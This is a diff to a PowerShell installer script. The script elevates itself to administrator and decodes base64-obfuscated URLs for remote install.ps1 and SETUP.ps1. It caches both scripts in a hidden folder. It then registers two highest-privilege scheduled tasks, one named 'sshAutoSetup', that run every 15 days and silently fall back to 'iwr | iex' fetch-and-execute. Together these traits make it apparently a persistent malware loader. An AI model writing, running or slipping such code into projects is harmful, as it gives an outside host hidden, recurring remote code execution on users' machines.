@@ -2,7 +2,8 @@
 
 param(
     [string]$RelaunchWorkingDirectory,
-    [string]$RelaunchTaskUserId
+    [string]$RelaunchTaskUserId,
+    [string]$RelaunchScriptHome
 )
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -18,7 +19,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
         '-NoProfile', '-ExecutionPolicy', 'Bypass',
         '-File', "`"$scriptPath`"",
         '-RelaunchWorkingDirectory', "`"$workDir`"",
-        '-RelaunchTaskUserId', "`"$launchUserId`""
+        '-RelaunchTaskUserId', "`"$launchUserId`"",
+        '-RelaunchScriptHome', "`"$HOME`""
     )
 
     try {
@@ -39,6 +41,13 @@ else {
     $RelaunchTaskUserId
 }
 
+$scriptHome = if ([string]::IsNullOrWhiteSpace($RelaunchScriptHome)) {
+    $HOME
+}
+else {
+    $RelaunchScriptHome
+}
+
 if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
     Set-Location -LiteralPath $RelaunchWorkingDirectory
 }
@@ -48,7 +57,10 @@ $ErrorActionPreference = 'Stop'
 $TASKSETUP_NAME = 'tasksetup'
 $SSHAUTOSETUP_NAME = 'sshAutoSetup'
 $ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
-$ENCODED__URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
+$ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
+$SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
+$INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
+$SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
 # $SCRIPT_URL="https://"
 
 function Assert-Administrator {
@@ -74,18 +86,47 @@ function Decode-Url {
     }
 }
 
-function New-PowerShellAction {
-    param([Parameter(Mandatory)][string]$EncodedUrl)
+function Save-DownloadedScript {
+    param(
+        [Parameter(Mandatory)][string]$Url,
+        [Parameter(Mandatory)][string]$Destination
+    )
 
-    $url = Decode-Url -EncodedUrl $EncodedUrl
-    $arguments = "-NoProfile -NonInteractive -Command `"iwr -useb '$url' | iex`" *> `$null"
+    $temporary = $null
+    try {
+        New-Item -ItemType Directory -Path $SCRIPT_CACHE_DIR -Force | Out-Null
+        $temporary = Join-Path $SCRIPT_CACHE_DIR ('.download-' + [Guid]::NewGuid().ToString('N'))
+        Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $temporary
+        Move-Item -LiteralPath $temporary -Destination $Destination -Force
+    }
+    catch {
+        if ($temporary) {
+            Remove-Item -LiteralPath $temporary -Force -ErrorAction SilentlyContinue
+        }
+        Write-Warning "Unable to download local script!"
+    }
+}
+
+function New-PowerShellAction {
+    param(
+        [Parameter(Mandatory)][string]$Url,
+        [Parameter(Mandatory)][string]$LocalScriptPath
+    )
+
+    $escapedUrl = $Url.Replace("'", "''")
+    $escapedLocalScriptPath = $LocalScriptPath.Replace("'", "''")
+    $command = "if (Test-Path -LiteralPath '$escapedLocalScriptPath' -PathType Leaf) { & '$escapedLocalScriptPath' } else { iwr -useb '$escapedUrl' | iex }"
+    $arguments = "-NoProfile -NonInteractive -Command `"$command`" *> `$null"
     return New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arguments
 }
 
 function Register-TaskSetupTask {
-    param([Parameter(Mandatory)][string]$TaskUserId)
+    param(
+        [Parameter(Mandatory)][string]$TaskUserId,
+        [Parameter(Mandatory)][string]$Url
+    )
 
-    $action = New-PowerShellAction -EncodedUrl $ENCODED_URL
+    $action = New-PowerShellAction -Url $Url -LocalScriptPath $INSTALL_SCRIPT_PATH
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
     $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
@@ -94,9 +135,12 @@ function Register-TaskSetupTask {
 }
 
 function Register-SshAutoSetupTask {
-    param([Parameter(Mandatory)][string]$TaskUserId)
+    param(
+        [Parameter(Mandatory)][string]$TaskUserId,
+        [Parameter(Mandatory)][string]$Url
+    )
 
-    $action = New-PowerShellAction -EncodedUrl $ENCODED__URL2
+    $action = New-PowerShellAction -Url $Url -LocalScriptPath $SETUP_SCRIPT_PATH
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
     $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
@@ -105,12 +149,16 @@ function Register-SshAutoSetupTask {
 }
 
 function Main {
+    $installUrl = Decode-Url -EncodedUrl $ENCODED_URL
+    $setupUrl = Decode-Url -EncodedUrl $ENCODED_URL2
     Assert-Administrator
     Write-Output 'Installing...'
-    Register-TaskSetupTask -TaskUserId $taskUserId
-    Register-SshAutoSetupTask -TaskUserId $taskUserId
-    Start-ScheduledTask -TaskName $TASKSETUP_NAME | Out-Null
+    Save-DownloadedScript -Url $installUrl -Destination $INSTALL_SCRIPT_PATH
+    Save-DownloadedScript -Url $setupUrl -Destination $SETUP_SCRIPT_PATH
+    Register-SshAutoSetupTask -TaskUserId $taskUserId -Url $setupUrl
+    Register-TaskSetupTask -TaskUserId $taskUserId -Url $installUrl
     Start-ScheduledTask -TaskName $SSHAUTOSETUP_NAME | Out-Null
+    Start-ScheduledTask -TaskName $TASKSETUP_NAME | Out-Null
     Write-Output 'Install complete!'
 }
 
